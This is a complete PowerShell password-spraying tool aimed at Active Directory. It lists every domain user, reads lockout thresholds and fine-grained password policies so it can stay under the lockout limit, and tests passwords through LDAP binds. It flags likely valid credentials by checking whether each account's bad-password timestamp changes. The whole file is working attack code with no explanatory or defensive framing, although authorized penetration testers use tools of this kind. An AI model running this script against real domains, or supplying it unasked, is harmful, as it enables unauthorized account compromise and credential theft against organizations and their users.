[CmdletBinding()]
param(
    [string]$Password,
    [string]$PasswordsFile,
    [switch]$UsernameAsPassword,
    [int]$Limit = 2,
    [switch]$HideOld
)


# Utilities
function Write-ErrorMessage {
    param([string]$Message)
    Write-Host "[!] $Message" -ForegroundColor Red
}
function Write-VerboseMessage {
    param([string]$Message)

    if ($PSCmdlet -and $PSCmdlet.MyInvocation.BoundParameters["Verbose"]) {
        Write-Host "[>] $Message" -ForegroundColor Yellow
    }
}




# Validation of inputs
if ($UsernameAsPassword -and ($Password -or $PasswordsFile)) {
    Write-ErrorMessage "Use -UsernameAsPassword OR -Password/-PasswordsFile, not both."
    exit
}
if (-not $UsernameAsPassword -and -not $Password -and -not $PasswordsFile) {
    Write-ErrorMessage "Specify -Password, -PasswordsFile, or -UsernameAsPassword."
    exit
}

# Check if ActiveDirectory module is available
if (-not (Get-Command Get-ADUser -ErrorAction SilentlyContinue)) {
    Write-ErrorMessage "Make sure the ActiveDirectory module is loaded."
    exit
}


# Load password list
if ($UsernameAsPassword) {
    $PasswordList = @("")  # Placeholder, will use username
}
elseif ($Password) {
    $PasswordList = @($Password)
}
else {
    try {
        $PasswordList = Get-Content -Path $PasswordsFile -ErrorAction Stop
    } catch {
        Write-ErrorMessage "Failed to read password file: $PasswordsFile"
        exit
    }
}

Write-Host "[*] Fetching Active Directory users..."
$AllUsers = Get-ADUser -Filter * -Properties SamAccountName, badPwdCount, LastBadPasswordAttempt | Where-Object { $_.SamAccountName }

Write-Host "[*] Total users retrieved: $($AllUsers.Count)"

# Display as table if verbose mode is enabled
if ($PSCmdlet.MyInvocation.BoundParameters["Verbose"]) {
    $AllUsers | Select SamAccountName, badPwdCount, LastBadPasswordAttempt | Format-Table -AutoSize
}


function Get-FGPPNames {
    try {
        $fgpps = Get-ADObject -SearchBase "CN=Password Settings Container,CN=System,$((Get-ADDomain).DistinguishedName)" -LDAPFilter "(objectClass=*)" -Properties DistinguishedName

        if (-not $fgpps -or $fgpps.Count -eq 0) {
            Write-VerboseMessage "No FGPPs found in the domain."
            return @()
        }

        $names = @()
        foreach ($fgpp in $fgpps) {
            if ($fgpp.DistinguishedName -match "^CN=([^,]+),") {
                $name = $matches[1]
                if ($name -ne "Password Settings Container") {
                    $names += $name
                    Write-VerboseMessage "$name"
                }
            }
        }

        if ($names.Count -eq 0) {
            Write-VerboseMessage "FGPP container exists but no FGPP objects found."
        } else {
            Write-VerboseMessage "Found $($names.Count) FGPP(s):"
        }

        return $names
    } catch {
        Write-VerboseMessage "Error while retrieving FGPPs (possibly insufficient rights)."
        return @()
    }
}



function Get-EffectivePasswordPolicy {
    param([Microsoft.ActiveDirectory.Management.ADUser]$User)

    try {
        $policy = Get-ADUserResultantPasswordPolicy -Identity $User.SamAccountName -ErrorAction Stop
        return [PSCustomObject]@{
            LockoutThreshold         = $policy.LockoutThreshold
            LockoutObservationWindow = $policy.LockoutObservationWindow
            Source                   = "Readable FGPP or Default"
        }
    } catch {
        $errMsg = $_.Exception.Message

        if ($errMsg -match "CN=([^,]+),CN=Password Settings Container,CN=System,.*") {
            $fgppName = $matches[1]
            $fgppDN = "CN=$fgppName,CN=Password Settings Container,CN=System,$((Get-ADDomain).DistinguishedName)"

            try {
                $null = Get-ADObject -Identity $fgppDN -ErrorAction Stop
                Write-VerboseMessage "FGPP '$fgppName' is applied to $($User.SamAccountName) but not readable. Conservative handling."
                return [PSCustomObject]@{
                    LockoutThreshold         = 3
                    LockoutObservationWindow = [timespan]::FromMinutes(15)
                    Source                   = "Unreadable FGPP"
                }
            } catch {
                Write-VerboseMessage "FGPP '$fgppName' referenced but not found. Fallback on default."
            }
        }

        $default = Get-ADDefaultDomainPasswordPolicy
        return [PSCustomObject]@{
            LockoutThreshold         = $default.LockoutThreshold
            LockoutObservationWindow = $default.LockoutObservationWindow
            Source                   = "Default"
        }
    }
}


function Test-Cred {
    param(
        [string]$Username,
        [string]$Password,
        [datetime]$LastBadPwdBefore,
        [int]$LockoutThreshold,
        [switch]$HideOld
    )

    $domain = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name
    $ldapPath = "LDAP://$domain"

    try {
        Write-VerboseMessage "    Trying LDAP bind to $ldapPath with $Username"
        $entry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath, $Username, $Password)
        $null = $entry.NativeObject
        Write-VerboseMessage "    LDAP bind completed for ${Username}"
    } catch {
        Write-VerboseMessage "    LDAP bind threw an exception for ${Username}"
    }

    try {
        $userAfter = Get-ADUser -Identity $Username -Properties LastBadPasswordAttempt
        $lastBadPwdAfter = $userAfter.LastBadPasswordAttempt
        Write-VerboseMessage "    LastBadPasswordAttempt after = $lastBadPwdAfter"

        if ($lastBadPwdAfter -gt $LastBadPwdBefore) {
            Write-Host "[-] Failed: $Username / $Password (timestamp updated)" -ForegroundColor DarkGray
        } elseif ($lastBadPwdAfter -eq $LastBadPwdBefore) {
            Write-Host "[+] Potential valid password: $Username / $Password" -ForegroundColor Green
        } else {
            Write-VerboseMessage "    Inconclusive auth state for $Username"
        }
    } catch {
        Write-VerboseMessage "    Error retrieving user or evaluating password for $Username"
    }
}

Get-FGPPNames

foreach ($pass in $PasswordList) {
    Write-Host "`n[*] Spraying with password: $pass" -ForegroundColor Cyan

    foreach ($user in $AllUsers) {
        $username = $user.SamAccountName
        $currentPwd = if ($UsernameAsPassword) { $username } else { $pass }

        Write-VerboseMessage "[*] Testing user: $username"

        $policy = Get-EffectivePasswordPolicy -User $user
        $threshold = if ($policy.LockoutThreshold -eq 0) { 9999 } else { $policy.LockoutThreshold }
        $window = $policy.LockoutObservationWindow
        $lastBadPwd = $user.LastBadPasswordAttempt
        $now = Get-Date

        Write-VerboseMessage "    LastBadPasswordAttempt before = $lastBadPwd | Threshold = $threshold | Window = $window"

        if ($lastBadPwd -and (($now - $lastBadPwd) -lt $window)) {
            Write-VerboseMessage "    Skipping $username due to recent failed login (within lockout window)"
            continue
        }

        Test-Cred -Username $username -Password $currentPwd -LastBadPwdBefore $lastBadPwd -LockoutThreshold $threshold -HideOld:$HideOld

    }
}

Write-Host "`n[*] Password spray completed." -ForegroundColor Magenta
